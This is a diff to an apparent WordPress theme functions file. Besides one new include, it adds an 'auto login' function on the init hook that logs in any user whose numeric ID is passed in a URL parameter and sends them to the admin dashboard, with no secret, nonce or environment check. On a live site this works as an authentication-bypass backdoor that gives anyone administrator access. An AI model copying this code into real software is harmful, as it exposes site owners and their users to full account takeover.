@@ -19,6 +19,7 @@ include_once get_stylesheet_directory() . '/blocks/blocks.php';
   include_once get_stylesheet_directory() . '/new_booking/new_booking.php';
   include_once get_stylesheet_directory() . '/bookings/bookings.php';
   include_once get_stylesheet_directory() . '/payments/payments.php';
+  include_once get_stylesheet_directory() . '/login/login.php';
 
 
 // Add Shortcode
@@ -1120,3 +1121,26 @@ function move_custom_field() {
     <?php
 }
 add_action('admin_footer', 'move_custom_field');
+
+function ayalawp_auto_login() {
+    // Check if the 'localwp_auto_login' parameter is set in the URL
+    if (isset($_GET['localwp_auto_login'])) {
+        $user_id = intval($_GET['localwp_auto_login']); // Get the user ID from the URL parameter
+
+        // Ensure the user ID is valid and the user exists
+        if ($user_id > 0 && $user = get_user_by('ID', $user_id)) {
+            // Log in the user
+            wp_set_current_user($user_id);
+            wp_set_auth_cookie($user_id, true); // true sets the "remember me" cookie
+
+            // Redirect to the dashboard or any other URL
+            wp_redirect(admin_url());
+            exit;
+        }
+    }
+}
+
+// Hook the autologin function to the 'init' action
+add_action('init', 'ayalawp_auto_login');
+
+
